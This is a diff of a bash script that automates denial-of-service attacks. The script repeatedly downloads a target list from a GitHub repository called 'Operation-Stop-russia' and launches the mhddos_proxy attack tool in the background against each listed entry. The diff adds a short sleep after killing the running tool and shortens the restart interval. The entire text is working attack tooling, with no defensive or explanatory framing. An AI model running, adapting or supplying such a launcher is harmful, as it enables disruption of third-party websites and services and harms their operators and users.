@@ -12,6 +12,7 @@ debug="--debug"
 while true
 do
    pkill -f runner.py
+   sleep 5
    list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
    while [[ $list_size = "0"  ]]
       do
@@ -23,5 +24,5 @@ do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
             python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
       done
-sleep 10m
+sleep 9m
 done
